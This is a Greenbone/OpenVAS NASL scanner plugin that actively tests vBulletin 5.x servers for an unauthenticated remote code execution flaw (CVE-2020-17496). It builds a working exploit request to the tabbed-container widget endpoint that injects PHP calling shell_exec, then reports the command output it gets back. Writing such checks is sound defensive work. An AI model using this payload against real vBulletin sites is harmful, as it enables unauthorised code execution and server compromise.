# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vbulletin:vbulletin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144371");
  script_version("2025-05-29T05:40:25+0000");
  script_tag(name:"last_modification", value:"2025-05-29 05:40:25 +0000 (Thu, 29 May 2025)");
  script_tag(name:"creation_date", value:"2020-08-10 03:36:07 +0000 (Mon, 10 Aug 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-08-17 18:07:00 +0000 (Mon, 17 Aug 2020)");

  script_cve_id("CVE-2020-17496", "CVE-2020-7373");

  script_tag(name:"qod_type", value:"exploit");

  script_name("vBulletin 5.x RCE Vulnerability (Aug 2020) - Active Check");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("vbulletin_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vbulletin/http/detected");

  script_tag(name:"summary", value:"vBulletin is prone to an unauthenticated remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"It is possible to bypass the patch for CVE-2019-16759 and
  execute arbitrary code on the system as the user running vBulletin.");

  script_tag(name:"impact", value:"An unauthenticated attacker may execute arbitrary code on the
  system as the user running vBulletin.");

  script_tag(name:"affected", value:"vBulletin version 5.x.");

  script_tag(name:"solution", value:"Apply the provided patch for versions 5.6.x.");

  script_xref(name:"URL", value:"https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/");
  script_xref(name:"URL", value:"https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("list_array_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/ajax/render/widget_tabbedcontainer_tab_panel";

headers = make_array("Content-Type", "application/x-www-form-urlencoded");
vt_strings = get_vt_strings();

cmds = exploit_commands();
foreach pattern(keys(cmds)) {
  cmd = cmds[pattern];
  final_checks[pattern] = "shell_exec%28%27" + cmd;
}

# nb: shell_exec might be disabled so use bin2hex in addition to it.
final_checks[vt_strings["default_rand_hex"]] = "bin2hex%28%27" + vt_strings["default_rand"];

foreach pattern(keys(final_checks)) {

  cmd = final_checks[pattern];
  data = "subWidgets%5b0%5d%5btemplate%5d=widget_php&subWidgets%5b0%5d%5bconfig%5d%5bcode%5d=echo%20" + cmd + "%27%29%3B%20exit%3B";

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {

    info['1. "HTTP POST" body'] = data;
    info['2. URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
    info['3. Used command'] = cmd;
    info['4. Expected result'] = pattern;

    report  = 'By doing the following request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to execute a command on the target.';
    report += '\n\nResult: ' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
